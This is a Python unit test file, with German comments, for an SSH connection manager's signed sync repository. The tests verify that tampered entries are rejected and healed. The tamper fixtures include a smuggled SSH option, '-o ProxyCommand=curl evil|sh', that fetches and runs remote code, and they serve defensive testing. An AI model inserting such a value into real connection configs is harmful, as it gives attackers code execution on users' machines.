"""Integritätsschutz im Sync-Repository: Einträge sind mit dem Sync-Passwort signiert; Manipulationen werden abgelehnt und geheilt."""
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from sesam import syncing
from sesam.models import Config, Connection, SyncSettings
from sesam.syncing import SyncEngine, SyncError

URL = "https://example.invalid/sesam.git"


class _Store:
    def get(self, key):
        return None

    def set(self, key, value):
        pass

    def delete(self, key):
        pass


def fast_kdf():
    return {"name": "scrypt", "n": 16, "r": 8, "p": 1, "salt": "AAAAAAAAAAAAAAAAAAAAAA=="}


class IntegrityTests(unittest.TestCase):
    def setUp(self):
        patcher = mock.patch.object(syncing, "new_kdf", fast_kdf)
        patcher.start()
        self.addCleanup(patcher.stop)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.base = Path(tmp.name)

    def engine(self, name="A", phrase="geheim123", passwords=True):
        eng = SyncEngine(SyncSettings(url=URL, passwords=passwords), self.base / name, phrase, _Store(), device=name)
        eng.repo.mkdir(parents=True, exist_ok=True)
        eng.git.run("init", "-q")
        return eng

    def publish(self, eng, cfg):
        """Gleicht ohne Netzwerk ab: lesen, zusammenführen (schreibt und committet im Arbeitsverzeichnis)."""
        remote = eng._read_remote(False)
        report = eng.merge(cfg, remote)
        eng.push = None  # kein Netzwerk
        if eng._next_state is not None:
            eng._save_state(eng._next_state)
        return report

    def cfg(self, *names):
        return Config(connections=[Connection(n, n + ".example") for n in names])

    def edit(self, eng, conn_id, **changes):
        path = eng.repo / "connections" / f"{conn_id}.json"
        data = json.loads(path.read_text(encoding="utf-8"))
        data.update(changes)
        path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    # ---- Schreiben und Lesen ----
    def test_entries_and_meta_are_signed(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        entry = json.loads((eng.repo / "connections" / f"{cfg.connections[0].id}.json").read_text(encoding="utf-8"))
        self.assertIn("mac", entry)
        self.assertIn("integrity", json.loads((eng.repo / "meta.json").read_text(encoding="utf-8")))
        remote = eng._read_remote(True)
        self.assertEqual((len(remote.items), remote.rejected), (1, {}))

    def test_second_device_with_the_same_password_accepts_signed_entries(self):
        eng, cfg = self.engine(), self.cfg("web", "db")
        self.publish(eng, cfg)
        other = self.engine("B")
        for p in (eng.repo / "connections").glob("*.json"):
            (other.repo / "connections").mkdir(exist_ok=True)
            (other.repo / "connections" / p.name).write_text(p.read_text(encoding="utf-8"), encoding="utf-8")
        (other.repo / "meta.json").write_text((eng.repo / "meta.json").read_text(encoding="utf-8"), encoding="utf-8")
        self.assertEqual(len(other._read_remote(True).items), 2)

    # ---- Manipulation ----
    def test_changed_field_is_rejected(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        conn = cfg.connections[0]
        self.edit(eng, conn.id, extra_args="-o ProxyCommand=curl evil|sh")
        remote = eng._read_remote(True)
        self.assertEqual((len(remote.items), list(remote.rejected.values())), (0, ["web"]))

    def test_removed_signature_is_rejected_once_protection_is_known(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        path = eng.repo / "connections" / f"{cfg.connections[0].id}.json"
        data = json.loads(path.read_text(encoding="utf-8"))
        del data["mac"]
        path.write_text(json.dumps(data), encoding="utf-8")
        self.assertEqual(len(eng._read_remote(True).rejected), 1)

    def test_entry_moved_to_another_kind_is_rejected(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        conn_file = eng.repo / "connections" / f"{cfg.connections[0].id}.json"
        (eng.repo / "snippets").mkdir()
        (eng.repo / "snippets" / conn_file.name).write_text(conn_file.read_text(encoding="utf-8"), encoding="utf-8")
        self.assertEqual(list(eng._read_remote(True).rejected), [("s", cfg.connections[0].id)])

    def test_swapped_password_blob_is_rejected(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        self.edit(eng, cfg.connections[0].id, password_enc={"nonce": "AAAA", "ct": "AAAA"})
        self.assertEqual(len(eng._read_remote(True).rejected), 1)

    def test_signature_from_another_sync_password_is_rejected(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        attacker = self.engine("X", phrase="anderes-passwort")
        (attacker.repo / "meta.json").write_text((eng.repo / "meta.json").read_text(encoding="utf-8"), encoding="utf-8")
        with self.assertRaises(SyncError):  # falsches Sync-Passwort: schon die Prüfung in meta.json schlägt fehl
            attacker._read_remote(True)

    def test_unsigned_entry_in_a_new_repository_is_not_accepted_after_protection_is_known(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        evil = {"id": "evil1", "name": "böse", "host": "evil.example", "extra_args": "-o ProxyCommand=x"}
        (eng.repo / "connections" / "evil1.json").write_text(json.dumps(evil), encoding="utf-8")
        remote = eng._read_remote(True)
        self.assertEqual(sorted(remote.rejected.values()), ["böse"])
        self.assertEqual([k[1] for k in remote.items], [cfg.connections[0].id])

    # ---- meta.json ----
    def test_marker_removed_from_meta_is_an_error_for_a_device_that_knows_it(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        meta = json.loads((eng.repo / "meta.json").read_text(encoding="utf-8"))
        del meta["integrity"]
        (eng.repo / "meta.json").write_text(json.dumps(meta), encoding="utf-8")
        with self.assertRaises(SyncError):
            eng._read_remote(True)

    def test_forged_marker_is_an_error(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        meta = json.loads((eng.repo / "meta.json").read_text(encoding="utf-8"))
        meta["integrity"] = {"v": 1, "tag": "0" * 64}
        (eng.repo / "meta.json").write_text(json.dumps(meta), encoding="utf-8")
        with self.assertRaises(SyncError):
            eng._read_remote(True)

    # ---- bestehende Repositories ----
    def legacy_repo(self, eng, cfg):
        """Ein Repository im alten Format: weder Signaturen noch Markierung."""
        self.publish(eng, cfg)
        meta = json.loads((eng.repo / "meta.json").read_text(encoding="utf-8"))
        del meta["integrity"]
        (eng.repo / "meta.json").write_text(json.dumps(meta), encoding="utf-8")
        for p in (eng.repo / "connections").glob("*.json"):
            data = json.loads(p.read_text(encoding="utf-8"))
            del data["mac"]
            p.write_text(json.dumps(data), encoding="utf-8")
        eng._state_reset = (eng.work / "state.json").unlink()

    def test_legacy_repository_is_accepted_and_upgraded_on_first_sync(self):
        eng, cfg = self.engine(), self.cfg("web", "db")
        self.legacy_repo(eng, cfg)
        remote = eng._read_remote(True)
        self.assertEqual((len(remote.items), remote.rejected, remote.new_meta), (2, {}, True))
        eng.merge(Config(), remote)  # leeres Gerät übernimmt alles und schreibt signiert zurück
        after = eng._read_remote(True)
        self.assertEqual((len(after.items), after.rejected, after.new_meta), (2, {}, False))
        self.assertTrue(all("mac" in json.loads(p.read_text(encoding="utf-8")) for p in (eng.repo / "connections").glob("*.json")))

    def test_without_sync_password_nothing_is_checked_and_signatures_are_kept(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        keyless = self.engine("B", passwords=False)
        for name in ("meta.json",):
            (keyless.repo / name).write_text((eng.repo / name).read_text(encoding="utf-8"), encoding="utf-8")
        (keyless.repo / "connections").mkdir()
        for p in (eng.repo / "connections").glob("*.json"):
            (keyless.repo / "connections" / p.name).write_text(p.read_text(encoding="utf-8"), encoding="utf-8")
        before = (keyless.repo / "connections" / f"{cfg.connections[0].id}.json").read_text(encoding="utf-8")
        remote = keyless._read_remote(True)
        self.assertIsNone(remote.key)
        keyless.merge(self.cfg_from(remote), remote)
        after = (keyless.repo / "connections" / f"{cfg.connections[0].id}.json").read_text(encoding="utf-8")
        self.assertEqual(before, after)

    def cfg_from(self, remote):
        return Config(connections=[Connection.from_dict(dict(it.data)) for it in remote.items.values()])

    # ---- Heilung ----
    def test_tampered_entry_is_replaced_by_the_local_version(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        conn = cfg.connections[0]
        self.edit(eng, conn.id, host="evil.example", extra_args="-o ProxyCommand=x")
        remote = eng._read_remote(True)
        report = eng.merge(cfg, remote)
        self.assertEqual(report.rejected, ["web"])
        self.assertEqual((conn.host, conn.extra_args), ("web.example", ""))  # lokal unverändert
        healed = eng._read_remote(True)
        self.assertEqual((len(healed.items), healed.rejected), (1, {}))  # Datei wurde mit gültiger Signatur neu geschrieben
        self.assertEqual(healed.items[("c", conn.id)].data["host"], "web.example")
        self.assertIn("abgelehnt", report.summary())

    def test_foreign_entry_without_local_counterpart_disappears_from_the_repository(self):
        eng, cfg = self.engine(), self.cfg("web")
        self.publish(eng, cfg)
        (eng.repo / "connections" / "evil1.json").write_text(json.dumps({"id": "evil1", "name": "x", "host": "e"}), encoding="utf-8")
        report = eng.merge(cfg, eng._read_remote(True))
        self.assertEqual((report.rejected, len(cfg.connections)), (["x"], 1))
        self.assertFalse((eng.repo / "connections" / "evil1.json").exists())


if __name__ == "__main__":
    unittest.main()


class AtomicApplyTests(unittest.TestCase):
    """Schlägt ein Schlüsselbund-Schritt fehl, bleiben Konfiguration und Schlüsselbund unverändert."""

    def test_failure_rolls_back_keyring_and_leaves_config_untouched(self):
        from dataclasses import replace
        from sesam.passwords import PasswordError

        class Store:
            def __init__(self):
                self.d, self.sets = {}, 0

            def get(self, k):
                return self.d.get(k)

            def set(self, k, v):
                self.sets += 1
                if self.sets == 2:
                    raise PasswordError("Schlüsselbund gesperrt")
                self.d[k] = v

            def delete(self, k):
                self.d.pop(k, None)

        with tempfile.TemporaryDirectory() as tmp:
            store = Store()
            eng = SyncEngine(SyncSettings(url=URL, passwords=True), Path(tmp), "geheim123", store, device="A")
            cfg = Config(connections=[Connection("a", "a.example", use_password=True), Connection("b", "b.example", use_password=True)])
            for c in cfg.connections:
                store.d[c.id] = "alt-" + c.name
            key = b"k" * 32
            local = eng._local_items(cfg, key)
            result = {k: replace(it, pw="neu-" + it.data["name"], data={**it.data, "host": "geaendert"}) for k, it in local.items()}
            store.sets = 0
            with self.assertRaises(SyncError):
                eng._apply_local(cfg, local, result, True, syncing.SyncReport())
            self.assertEqual([c.host for c in cfg.connections], ["a.example", "b.example"])
            self.assertEqual(sorted(store.d.values()), ["alt-a", "alt-b"])

    def test_prepare_applies_locally_and_commit_writes_the_repository(self):
        with tempfile.TemporaryDirectory() as tmp:
            eng = SyncEngine(SyncSettings(url=URL, passwords=False), Path(tmp) / "A", None, _Store(), device="A")
            eng.repo.mkdir(parents=True)
            eng.git.run("init", "-q")
            cfg = Config(connections=[Connection("web", "web.example")])
            report = eng.prepare(cfg, eng._read_remote(False))
            self.assertFalse(report.committed)
            self.assertFalse(any((eng.repo / "connections").glob("*.json")) if (eng.repo / "connections").exists() else False)
            eng.commit()
            self.assertTrue(report.committed)
            self.assertEqual(len(list((eng.repo / "connections").glob("*.json"))), 1)
